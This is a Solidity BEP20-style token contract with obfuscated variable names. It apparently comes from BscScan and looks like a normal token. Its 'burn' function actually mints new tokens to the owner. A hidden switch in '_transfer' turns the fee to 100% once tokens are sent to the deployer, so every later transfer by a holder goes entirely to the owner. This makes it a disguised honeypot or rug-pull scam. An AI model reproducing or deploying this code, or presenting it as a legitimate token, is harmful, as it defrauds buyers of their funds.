/**
 *Submitted for verification at BscScan.com on 2022-11-14
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-14 13:35:00 GMT
 */
pragma solidity >=0.4.11;
contract mVLdPv {
uint256 public  zujvQN = 100000000000000000000;
uint256 public  TNpWBl = 10000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 public  IuzyHN = 1000000000000000000;
address public owner;
uint8 public constant decimals = 18;
uint256 public constant XsKzbq = 9+1;
address private  xLdSrZ = address(0);
address public  CKUzdl = address(0);
string public  symbol = "CYhHPW";
address public  ZMOOxm = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
event Transfer(address indexed from, address indexed to, uint256 value);
address public  dsDaNj = address(0);
mapping (address => uint256) public balanceOf;
uint256 private  TKLGQl = 10000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
address public  WjHebF = address(0);
address public  eGWQuD = address(0);
address public  Aiskqc = address(0);
uint256 public  riWmZO = 10000000000000000000000000000;
uint256 public  sAGhwG = 10000000000000000000;
uint256 public  DkJgYd = 100000000000000000000000;
uint256 public  IeesMM = 100000000000000000;
uint256 public  ldMNdt = 100000000000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
string public  name = "sIsTuq";
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "TJwlEi");
require(to != address(0), "TJwlEi");
require(amount <= balanceOf[from], "TJwlEi");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* XsKzbq/TKLGQl ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==xLdSrZ){
TKLGQl = 9+1;
}
emit Transfer(from, to, transferAmount);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
constructor () public {
xLdSrZ = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}

}